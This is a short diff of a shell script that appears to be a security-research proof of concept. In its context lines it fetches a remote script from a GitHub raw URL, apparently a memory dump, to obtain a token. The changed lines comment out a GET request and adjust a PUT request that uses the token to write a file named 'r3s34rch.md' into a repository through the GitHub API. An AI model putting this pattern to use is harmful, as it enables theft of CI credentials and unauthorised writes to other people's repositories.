@@ -9,12 +9,12 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 #echo "${TOKEN_VAL}"
 #echo "-----------------------------------------------------------------"
 
-curl \
-  -H "Accept: application/vnd.github.v3+json" \
-  -H "Authorization: token $TOKEN_VAL" \
-  "https://api.github.com/repos/${REPO}/contents/r3s34rch.md"
+#curl \
+#  -H "Accept: application/vnd.github.v3+json" \
+#  -H "Authorization: token $TOKEN_VAL" \
+#  "https://api.github.com/repos/${REPO}/contents/r3s34rch.md"
 
-curl \
+curl -i \
     -X PUT \
     -H "Accept: application/vnd.github.v3+json" \
     -H "Authorization: token $TOKEN_VAL" \
